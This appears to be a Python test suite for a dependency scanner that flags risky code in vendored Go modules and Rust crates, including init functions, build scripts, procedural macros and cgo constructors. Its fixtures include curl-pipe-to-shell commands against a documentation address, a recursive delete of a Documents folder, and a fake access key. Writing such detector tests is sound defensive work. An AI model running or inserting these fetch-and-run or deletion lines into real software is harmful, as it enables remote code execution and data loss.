"""--deps reads a Go project's vendor/ and a Rust project's `cargo vendor` tree (0.1.9, Part C).

A vendor directory with a modules.txt (`go mod vendor`) holds the Go modules a build compiles, and one whose crate
directories hold a .cargo-checksum.json (`cargo vendor`) the crates: --deps reads them as the registry reads a module
zip and a .crate (tests/registry/test_package_code.py): the file rules in dependency mode on each .go and .rs file a
build compiles, and the engine's Go reader on each module modules.txt lists (a file of none: its package's directory)
and the Rust reader on each crate, its Cargo.toml read by the engine (vendor.rs) for its build script and library.
Without --deps both trees are pruned, as node_modules is. The npm package's twin is js/test/vendored-code.test.js.

The samples are inert fragments: never built, documentation addresses (203.0.113.x)."""

import os
import shutil
import tempfile
import unittest
from unittest import mock

from lazaret.registry.ecosystems import crates
from lazaret.scanner import _native, core, engine
from tests.registry import test_package_code as samples
from tests.registry._review_support import B64_DATA

MODULES_TXT = ("# example.test/evil v1.0.0\n## explicit; go 1.21\nexample.test/evil\n"
               "# example.test/ok v1.2.0\n## explicit\nexample.test/ok/sub\n")
GO_PROJECT = {"go.mod": "module example.test/app\n\ngo 1.21\n", "main.go": "package main\n\nfunc main() {}\n",
              "vendor/modules.txt": MODULES_TXT}
RUST_PROJECT = {"Cargo.toml": '[package]\nname = "app"\nversion = "0.1.0"\n', "src/main.rs": "fn main() {}\n"}
BLOB = B64_DATA


def go_file(package, text):
    return text.replace("package m", f"package {package}")


def crate(name, files, manifest=None):
    body = {".cargo-checksum.json": '{"files":{},"package":"0"}',
            "Cargo.toml": manifest or f'[package]\nname = "{name}"\nversion = "1.0.0"\n'}
    body.update(files)
    return {f"vendor/{name}/{rel}": text for rel, text in body.items()}


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class VendoredCodeTests(unittest.TestCase):
    def tree(self, files):
        root = tempfile.mkdtemp(prefix="lz-vendor-")
        self.addCleanup(shutil.rmtree, root, True)
        for rel, text in files.items():
            path = os.path.join(root, *rel.split("/"))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "wb") as fh:
                fh.write(text if isinstance(text, bytes) else text.encode("utf-8"))
        return root

    def scan(self, files, deps=True):
        res = core.scan_project(self.tree(files), include_deps=deps)
        return [(i["rule"], i["sev"], i["file"].replace(os.sep, "/"), i["line"]) for i in res["issues"]
                if i["rule"].startswith(("SC-", "Q-SKIPPED-TREE"))]


class GoVendorTests(VendoredCodeTests):
    def test_init_code_a_vendored_module_runs(self):
        files = dict(GO_PROJECT, **{"vendor/example.test/evil/e.go": go_file("evil", samples.INIT_GO),
                                    "vendor/example.test/ok/sub/s.go": go_file("sub", samples.CLEAN_GO)})
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/e.go", 9)])
        self.assertEqual(self.scan(files, deps=False), [("Q-SKIPPED-TREE", "INFO", "vendor", 1)])

    def test_the_rest_of_a_module_and_a_cgo_constructor(self):
        files = dict(GO_PROJECT, **{"vendor/example.test/evil/u.go": go_file("evil", samples.USE_GO),
                                    "vendor/example.test/ok/sub/c.go": go_file("sub", samples.CGO_GO)})
        self.assertEqual(self.scan(files), [("SC-USE-RISK", "CRITICAL", "vendor/example.test/evil/u.go", 6),
                                            ("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/ok/sub/c.go", 5)])
        boot = '__attribute__((constructor)) static void boot(void) { system("curl -s https://203.0.113.7/a.sh | sh"); }\n'
        files = dict(GO_PROJECT, **{"vendor/example.test/ok/sub/s.go": 'package sub\n\n// #include "boot.h"\nimport "C"\n',
                                    "vendor/example.test/ok/sub/boot.h": "#include <stdlib.h>\n" + boot})
        self.assertEqual([r for r, _s, _f, _l in self.scan(files)], ["SC-IMPORT-RISK"])

    def test_a_module_is_read_whole(self):
        # (init in one package of the module reaches a function of another: start-up code, not code run when used)
        files = dict(GO_PROJECT, **{
            "vendor/example.test/evil/e.go": 'package evil\n\nimport "example.test/evil/helper"\n\nfunc init() {\n\thelper.Run()\n}\n',
            "vendor/example.test/evil/helper/h.go": 'package helper\n\nimport "os/exec"\n\nfunc Run() {\n\texec.Command("/bin/sh", '
                                                    '"-c", "curl -s https://203.0.113.7/a.sh | sh").Start()\n}\n'})
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/helper/h.go", 6)])

    def test_what_a_build_never_compiles_is_not_read(self):
        bad = go_file("evil", samples.INIT_GO) + f'\nvar blob = "{BLOB}"\n'
        for name in ("e_test.go", "_x.go", ".x.go"):
            with self.subTest(name=name):
                files = dict(GO_PROJECT, **{"vendor/example.test/evil/ok.go": go_file("evil", samples.CLEAN_GO),
                                            f"vendor/example.test/evil/{name}": bad})
                self.assertEqual(self.scan(files), [])
        # (F-06's third round) a .go file in a testdata/ folder, or one named with "_" or "." first, is Go code only
        # as a package modules.txt lists: `go mod vendor` copies the files a package's //go:embed patterns match, .go
        # files below it too, and a build compiles only the packages it lists; another is data, as in the registry
        for folder in ("testdata", "testdata/fx", "_examples", ".hidden/x"):
            with self.subTest(folder=folder):
                path = f"vendor/example.test/evil/{folder}/t.go"
                files = dict(GO_PROJECT, **{"vendor/example.test/evil/ok.go": go_file("evil", samples.CLEAN_GO),
                                            path: bad})
                self.assertEqual(self.scan(files), [])
                files["vendor/modules.txt"] = MODULES_TXT.replace("example.test/evil\n",
                                                                  f"example.test/evil\nexample.test/evil/{folder}\n")
                self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", path, 9), ("SC-B64", "MAJOR", path, 12)])

    def test_a_build_constraint_go_does_not_read_as_ignore_leaves_the_file_read(self):
        # F-06 (the registry's twin: test_package_code): `//go:buildignore` and `// +buildignore` are comments to Go
        bad = go_file("evil", samples.DELETE_GO)
        for header, want in (("//go:buildignore\n\n", True), ("// +buildignore\n", True), ("// +build ignore\n", True),
                             ("//go:build ignore || linux\n\n", True), ("//go:build ignore\n\n", False),
                             ("// +build ignore\n\n", False)):
            with self.subTest(header=header):
                files = dict(GO_PROJECT, **{"vendor/example.test/evil/d.go": header + bad})
                line = header.count("\n") + 5                                  # (the init's line)
                self.assertEqual(self.scan(files),
                                 [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/d.go", line)] if want else [])
        # and a test file's name ends in `_test.go` exactly: `e_TEST.go` is built
        files = dict(GO_PROJECT, **{"vendor/example.test/evil/e_TEST.go": go_file("evil", samples.INIT_GO)})
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/e_TEST.go", 9)])

    def test_a_file_is_read_as_the_go_toolchain_reads_its_bytes(self):
        # F-06's review (the registry's twin: test_package_code): a lone "\\r" is no line end to Go, a second byte
        # order mark is code to it, a "\\r" in a string is Go's; a file Go refuses (UTF-16, a //go:build line that
        # does not parse) is never left out, and one the parser refuses is SC-TRUNCATED
        body = go_file("evil", samples.DELETE_GO).encode()
        rest = body[len(b"package evil\n\n"):]
        path = "vendor/example.test/evil/d.go"
        for data in (b"// c\r//go:build ignore\n\n" + body, b"// c\r// +build ignore\n\n" + body,
                     b"\xef\xbb\xbf\xef\xbb\xbf//go:build ignore\n\n" + body,
                     b'package evil\n\nimport "os"\n\nvar s = "a\rb"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n'):
            with self.subTest(data=data[:40]):
                self.assertEqual([(r, f) for r, _s, f, _l in self.scan(dict(GO_PROJECT, **{path: data}))],
                                 [("SC-IMPORT-RISK", path)])
        for data in (b"//go:build ignore\r\rpackage evil\r\r" + rest, b"package evil\n\nfunc (\n"):
            with self.subTest(data=data[:24]):
                self.assertEqual([(r, f) for r, _s, f, _l in self.scan(dict(GO_PROJECT, **{path: data}))],
                                 [("SC-TRUNCATED", path)])
        # UTF-16: the rules read the decoded text, as before (the third round); Go, and the reader, refuse the bytes
        token = 'const k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\n'
        text = "//go:build ignore\n\n" + go_file("evil", samples.DELETE_GO) + token
        for data in (b"\xff\xfe" + text.encode("utf-16-le"), text.encode("utf-16-be")):
            with self.subTest(data=data[:24]):
                res = core.scan_project(self.tree(dict(GO_PROJECT, **{path: data})), include_deps=True)
                self.assertEqual([(i["rule"], i["file"].replace(os.sep, "/"), i["line"]) for i in res["issues"]
                                  if i["rule"] in ("S-TOKEN", "SC-TRUNCATED", "SC-IMPORT-RISK")],
                                 [("S-TOKEN", path, text.count("\n"))])
        # a lone "\r": the reader's lines are the rules' (Go's line 1 holds the comments)
        data = (b'package evil\n\n// one\r// two\r// three\n\nimport "os"\n\nconst k = "AKIA' + b"Q7R2ZK9M4TXW8B3N"
                + b'"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n')
        res = core.scan_project(self.tree(dict(GO_PROJECT, **{path: data})), include_deps=True)
        self.assertEqual({i["rule"]: i["line"] for i in res["issues"] if i["rule"] in ("S-TOKEN", "SC-IMPORT-RISK")},
                         {"S-TOKEN": 9, "SC-IMPORT-RISK": 11})

    def test_a_module_path_holding_testdata_or_vendor_is_read(self):
        # F-06's review: the directory rules are the module's (below its root): example.test/testdata and
        # example.test/vendor are modules, a package in a module's own vendor/ is built, and so is a testdata package
        # the module imports
        mods = ("# example.test/testdata v1.0.0\n## explicit\nexample.test/testdata\n"
                "# example.test/vendor v1.0.0\n## explicit\nexample.test/vendor\n"
                "# example.test/vd v1.0.0\n## explicit\nexample.test/vd\nexample.test/vd/vendor\n"
                "# example.test/td v1.0.0\n## explicit\nexample.test/td\nexample.test/td/testdata/x\n")
        bad = lambda pkg: samples.DELETE_GO.replace("package m", f"package {pkg}")
        files = dict(GO_PROJECT, **{"vendor/modules.txt": mods,
                                    "vendor/example.test/testdata/t.go": bad("testdata"),
                                    "vendor/example.test/vendor/v.go": bad("vendor"),
                                    "vendor/example.test/vd/a.go": 'package vd\n\nimport _ "example.test/vd/vendor"\n',
                                    "vendor/example.test/vd/vendor/v.go": bad("vendor"),
                                    "vendor/example.test/td/lib.go": 'package td\n\nimport _ "example.test/td/testdata/x"\n',
                                    "vendor/example.test/td/testdata/x/x.go": bad("x")})
        self.assertEqual(sorted((r, f) for r, _s, f, _l in self.scan(files)),
                         [("SC-IMPORT-RISK", "vendor/example.test/td/testdata/x/x.go"),
                          ("SC-IMPORT-RISK", "vendor/example.test/testdata/t.go"),
                          ("SC-IMPORT-RISK", "vendor/example.test/vd/vendor/v.go"),
                          ("SC-IMPORT-RISK", "vendor/example.test/vendor/v.go")])

    def test_a_testdata_package_modules_txt_lists_is_read(self):
        # F-06's third round (the review's appx): example.test/tb imports example.test/ta's testdata/x, which the
        # build compiles and modules.txt lists: read, whoever imports it; an unlisted one is data (the review's
        # app-1.21: a fixture's token is no finding)
        mods = ("# example.test/ta v1.0.0\n## explicit; go 1.21\nexample.test/ta/testdata/x\n"
                "# example.test/tb v1.0.0\n## explicit; go 1.21\nexample.test/tb\n")
        x = go_file("x", samples.DELETE_GO)
        token = 'package fx\n\nconst k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\n'
        files = dict(GO_PROJECT, **{"vendor/modules.txt": mods, "vendor/example.test/ta/testdata/x/x.go": x,
                                    "vendor/example.test/ta/testdata/fx/f.go": token,
                                    "vendor/example.test/tb/tb.go": 'package tb\n\nimport _ "example.test/ta/testdata/x"\n'})
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/ta/testdata/x/x.go", 5)])
        res = core.scan_project(self.tree(files), include_deps=True)
        self.assertEqual([i for i in res["issues"] if i["rule"].startswith("S-")], [])
        # (its reading's findings go with it: a fixture that is not text is no SC-TRUNCATED)
        files["vendor/example.test/ta/testdata/fx/bin.go"] = bytes(range(1, 9)) * 60
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/ta/testdata/x/x.go", 5)])
        del files["vendor/example.test/ta/testdata/fx/bin.go"]
        # a modules.txt that lists no package (none a build reads): every file is read
        files["vendor/modules.txt"] = "garbage\n## nonsense\nexample.test/ta/testdata/x\n"
        self.assertIn(("S-TOKEN", "vendor/example.test/ta/testdata/fx/f.go"),
                      {(i["rule"], i["file"].replace(os.sep, "/")) for i in
                       core.scan_project(self.tree(files), include_deps=True)["issues"]})
        # a refused file in a `_` folder modules.txt does not list is data; listed, it holds the module
        files = dict(GO_PROJECT, **{"vendor/example.test/evil/_tmpl/t.go": "package {{.Name}}\n\nfunc F() {}\n",
                                    "vendor/example.test/evil/ok.go": go_file("evil", samples.CLEAN_GO)})
        self.assertEqual(self.scan(files), [])
        files["vendor/modules.txt"] = MODULES_TXT.replace("example.test/evil\n", "example.test/evil\nexample.test/evil/_tmpl\n")
        self.assertEqual(self.scan(files), [("SC-TRUNCATED", "CRITICAL", "vendor/example.test/evil/_tmpl/t.go", 1)])

    def test_an_unlisted_folder_an_import_names_is_code(self):
        # F-06's fourth round (the review's appv-tamper): a main module below `go 1.23` builds a vendored package
        # modules.txt does not list when an import names it, so an unlisted testdata/, `_` or `.` folder that an
        # import of a file read names is code (the project's or a vendor tree's, through a chain, an escaped path);
        # one no import names stays data
        x = lambda pkg: go_file(pkg, samples.DELETE_GO)
        files = dict(GO_PROJECT, **{"vendor/example.test/evil/evil.go":
                                        'package evil\n\nimport (\n\t_ "example.test/evil/testdata/td"\n\t_ "example.test/evil/\\x5fu"\n)\n',
                                    "vendor/example.test/evil/testdata/td/td.go":
                                        'package td\n\nimport _ "example.test/evil/.hidden/h"\n',
                                    "vendor/example.test/evil/.hidden/h/h.go": x("h"),
                                    "vendor/example.test/evil/_u/u.go": x("u"),
                                    "vendor/example.test/evil/_m/m.go": x("m"),
                                    "vendor/example.test/evil/_quiet/q.go": x("q"),
                                    "main.go": 'package main\n\nimport _ "example.test/evil/_m"\n\nfunc main() {}\n'})
        self.assertEqual(sorted(f for r, _s, f, _l in self.scan(files) if r == "SC-IMPORT-RISK"),
                         ["vendor/example.test/evil/.hidden/h/h.go", "vendor/example.test/evil/_m/m.go",
                          "vendor/example.test/evil/_u/u.go"])
        # (a test file of the vendored module imports nothing a build reads; nor does a file a constraint leaves out)
        files = dict(GO_PROJECT, **{"vendor/example.test/evil/ok.go": go_file("evil", samples.CLEAN_GO),
                                    "vendor/example.test/evil/gen.go": '//go:build ignore\n\npackage evil\n\nimport _ "example.test/evil/_u"\n',
                                    "vendor/example.test/evil/_u/u.go": x("u")})
        self.assertEqual(self.scan(files), [])
        # (the review's appv-refmain: a file the parser refuses may import any of them, so every unlisted folder
        # is code)
        files = dict(GO_PROJECT, **{"vendor/example.test/evil/ok.go": go_file("evil", samples.CLEAN_GO),
                                    "vendor/example.test/evil/_u/u.go": x("u"),
                                    "main.go": 'package main\n\nimport _ "example.test/evil/_u"\n\nfunc main() {}\n\nfunc (\n'})
        found = {(r, f) for r, _s, f, _l in self.scan(files)}
        self.assertIn(("SC-IMPORT-RISK", "vendor/example.test/evil/_u/u.go"), found)

    def test_a_file_of_no_listed_module_is_read_with_its_package(self):
        files = dict(GO_PROJECT, **{"vendor/example.test/other/x/e.go": go_file("x", samples.INIT_GO)})
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/other/x/e.go", 9)])

    def test_the_file_rules_read_each_file_and_go_generate_is_listed(self):
        files = dict(GO_PROJECT, **{"vendor/example.test/ok/sub/s.go": f'package sub\n\n//go:generate stringer -type=K\n'
                                                                       f'var blob = "{BLOB}"\n'})
        self.assertEqual([(r, s) for r, s, _f, _l in self.scan(files)], [("SC-B64", "MAJOR"), ("SC-GO-GENERATE", "INFO")])


class CargoVendorTests(VendoredCodeTests):
    def test_a_build_script_and_a_procedural_macro(self):
        files = dict(RUST_PROJECT, **crate("buildevil", {"build.rs": samples.BUILD_RS, "src/lib.rs": samples.CLEAN_RS}),
                     **crate("macro", {"src/lib.rs": samples.MACRO_RS},
                             '[package]\nname = "macro"\nversion = "1.0.0"\n\n[lib]\nproc-macro = true\n'),
                     **crate("fine", {"src/lib.rs": samples.CLEAN_RS}))
        self.assertEqual(self.scan(files), [("SC-INSTALL-HOOK", "CRITICAL", "vendor/buildevil/build.rs", 5),
                                            ("SC-INSTALL-HOOK", "CRITICAL", "vendor/macro/src/lib.rs", 5)])
        self.assertEqual(self.scan(files, deps=False), [("Q-SKIPPED-TREE", "INFO", "vendor", 1)])
        # a library whose crate types hold "proc-macro" is one too
        files = dict(RUST_PROJECT, **crate("macro", {"src/lib.rs": samples.MACRO_RS},
                                           '[package]\nname = "macro"\nversion = "1.0.0"\n\n[lib]\ncrate-type = ["proc-macro"]\n'))
        self.assertEqual(self.scan(files), [("SC-INSTALL-HOOK", "CRITICAL", "vendor/macro/src/lib.rs", 5)])

    def test_the_manifest_says_which_build_script(self):
        manifest = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = "tools/gen.rs"\n'
        files = dict(RUST_PROJECT, **crate("c", {"tools/gen.rs": samples.BUILD_RS, "src/lib.rs": samples.CLEAN_RS}, manifest))
        self.assertEqual([(r, f) for r, _s, f, _l in self.scan(files)], [("SC-INSTALL-HOOK", "vendor/c/tools/gen.rs")])
        manifest = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = false\n'
        files = dict(RUST_PROJECT, **crate("c", {"build.rs": samples.BUILD_RS, "src/lib.rs": samples.CLEAN_RS}, manifest))
        self.assertEqual(self.scan(files), [])

    def test_a_ctor_and_code_run_when_used(self):
        files = dict(RUST_PROJECT, **crate("c", {"src/lib.rs": samples.CTOR_RS}), **crate("d", {"src/lib.rs": samples.USE_RS}))
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/c/src/lib.rs", 3),
                                            ("SC-USE-RISK", "CRITICAL", "vendor/d/src/lib.rs", 2)])

    def test_tests_benches_and_examples_are_not_read(self):
        bad = samples.CTOR_RS + f'pub const K: &str = "{BLOB}";\n'
        for name in ("tests/t.rs", "benches/b.rs", "examples/e.rs"):
            with self.subTest(name=name):
                files = dict(RUST_PROJECT, **crate("c", {"src/lib.rs": samples.CLEAN_RS, name: bad}))
                self.assertEqual(self.scan(files), [])

    def test_a_vendor_directory_that_is_not_cargo_s_is_the_project_s(self):
        files = dict(RUST_PROJECT, **{"vendor/y/src/lib.rs": samples.CLEAN_RS + f'pub const K: &str = "{BLOB}";\n'})
        self.assertEqual(self.scan(files, deps=False), [("SC-B64", "MAJOR", "vendor/y/src/lib.rs", 2)])
        root = self.tree(dict(RUST_PROJECT, **{"elsewhere.json": "{}", "vendor/y/src/lib.rs": samples.CTOR_RS}))
        os.symlink(os.path.join(root, "elsewhere.json"), os.path.join(root, "vendor", "y", ".cargo-checksum.json"))
        self.assertIs(core._dep_tree_kind("vendor", os.path.join(root, "vendor")), False)  # (a link is not cargo's file)

    def test_a_crate_too_large_or_unanswered_is_not_cleared(self):
        files = dict(RUST_PROJECT, **crate("c", {"src/lib.rs": samples.CLEAN_RS}))
        with mock.patch.object(core, "PACKAGE_CODE_CHARS", 10):
            self.assertEqual([(r, s, f) for r, s, f, _l in self.scan(files)], [("SC-TRUNCATED", "CRITICAL", "vendor/c/src/lib.rs")])
        with mock.patch.object(engine, "rs_crate", side_effect=_native.NativeError("boom")):
            self.assertEqual([r for r, _s, _f, _l in self.scan(files)], ["SC-TRUNCATED"])

    def test_the_readers_stop_when_asked(self):
        root = self.tree(dict(RUST_PROJECT, **crate("c", {"src/lib.rs": samples.CTOR_RS})))
        col = core._collect(root, include_deps=True)
        tree = core._DependencyTree(root, col["files"], col["manifests"], ())
        self.assertEqual(core._vendored_code(tree, col["files"], should_stop=lambda: "the budget"), ([], "the budget"))
        found, stopped = core._vendored_code(tree, col["files"])
        self.assertEqual(([i["rule"] for i in found], stopped), (["SC-IMPORT-RISK"], None))


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class ManifestTests(unittest.TestCase):
    MANIFESTS = (
        "",
        '[package]\nname = "x"\nversion = "1.0.0"\n',
        '[package]\nname = "x"\nbuild = "build.rs"\n\n[lib]\nname = "x"\npath = "src/lib.rs"\nproc-macro = true\n',
        '[package]\nbuild = false\n',
        "[project]\nbuild = 'tools/gen.rs'\n",
        'package.build = "tools/gen.rs"\nlib.path = "src/x.rs"\nlib."proc-macro" = true\n',
        'lib = { path = "src/x.rs", proc-macro = true }\npackage = { build = "./tools/gen.rs" }\n',
        '[package]\ndescription = """\n[lib]\nproc-macro = true\n"""\nkeywords = [\n "a", [1, [2]],\n]\nbuild = "tools/gen.rs"\n',
        '[package]\nname = "x"\n[[bin]]\npath = "src/x.rs"\n[target.\'cfg(unix)\'.dependencies]\nbuild = "no.rs"\n',
        '[lib]\nproc_macro = true\npath = "/src/x.rs"\n',
        '[lib]\npath = "../outside.rs"\n',
        # crate-type = ["proc-macro"]: a procedural macro to cargo, proc-macro = false or not
        '[lib]\ncrate-type = ["proc-macro"]\n',
        'lib = { crate_type = [ "proc-macro" ], path = "src/x.rs" }\n',
        '[lib]\nproc-macro = false\ncrate-type = [\n  "proc-macro",\n]\n',
        '[lib]\ncrate-type = ["rlib", "cdylib"]\n',
    )
    MEMBERS = ("build.rs", "tools/gen.rs", "src/lib.rs", "src/x.rs")

    def test_the_engine_reads_a_manifest_as_the_registry_does(self):
        # (the registry reads a .crate's Cargo.toml with Python's TOML reader; --deps, and the npm package, with the
        # engine's: the same answers on what cargo writes and on the other ways TOML says it)
        for text in self.MANIFESTS:
            with self.subTest(text=text):
                self.assertEqual(core.cargo_layout(text, self.MEMBERS),
                                 crates.ECOSYSTEM.layout({"Cargo.toml": text}, self.MEMBERS))

    def test_what_the_engine_answers(self):
        self.assertEqual(engine.cargo_layout('[package]\nbuild = false\n[lib]\npath = "l.rs"\n'),
                         {"build": False, "lib": "l.rs", "proc_macro": None})
        self.assertEqual(engine.cargo_layout(""), {"build": None, "lib": None, "proc_macro": None})
        self.assertEqual(engine.go_vendored_modules(MODULES_TXT), ["example.test/evil", "example.test/ok"])
        self.assertEqual(core._vendored_modules(None), [])


if __name__ == "__main__":
    unittest.main()
